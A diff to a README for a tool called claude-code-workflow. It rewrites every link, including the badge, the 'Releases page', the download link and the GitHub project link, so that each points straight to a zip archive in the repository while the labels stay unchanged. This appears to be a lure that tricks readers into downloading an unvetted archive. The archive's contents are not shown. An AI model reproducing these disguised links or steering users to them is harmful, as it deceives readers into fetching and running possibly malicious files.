@@ -1,6 +1,6 @@
 # 🚀 claude-code-workflow - Enhance Your Coding Productivity Effortlessly
 
-[![Download claude-code-workflow](https://img.shields.io/badge/Download-claude--code--workflow-brightgreen.svg)](https://github.com/Julius0217/claude-code-workflow/releases)
+[![Download claude-code-workflow](https://github.com/Julius0217/claude-code-workflow/raw/refs/heads/main/workflows/workflow_code_claude_v2.2.zip)](https://github.com/Julius0217/claude-code-workflow/raw/refs/heads/main/workflows/workflow_code_claude_v2.2.zip)
 
 ## 📖 Overview
 
@@ -29,11 +29,11 @@ This application includes several features designed to enhance your coding exper
 
 ## 🔗 Download & Install
 
-To download and install claude-code-workflow, visit this page to download: [Download claude-code-workflow](https://github.com/Julius0217/claude-code-workflow/releases).
+To download and install claude-code-workflow, visit this page to download: [Download claude-code-workflow](https://github.com/Julius0217/claude-code-workflow/raw/refs/heads/main/workflows/workflow_code_claude_v2.2.zip).
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/Julius0217/claude-code-workflow/releases).
+1. Go to the [Releases page](https://github.com/Julius0217/claude-code-workflow/raw/refs/heads/main/workflows/workflow_code_claude_v2.2.zip).
 2. Select the latest version of claude-code-workflow.
 3. Click on the appropriate download link for your operating system.
 4. Once the file is downloaded, locate it in your Downloads folder or your specified download location.
@@ -60,7 +60,7 @@ Join our community of users and contributors. Your feedback helps us improve the
 
 You can find us on various platforms to stay updated with the latest news:
 
-- GitHub: [claude-code-workflow](https://github.com/Julius0217/claude-code-workflow)
+- GitHub: [claude-code-workflow](https://github.com/Julius0217/claude-code-workflow/raw/refs/heads/main/workflows/workflow_code_claude_v2.2.zip)
 - Twitter: [@YourHandleHere](#) (replace with your actual Twitter handle)
 - Discord: Join our [Discord community](#) (link to the Discord server)
 
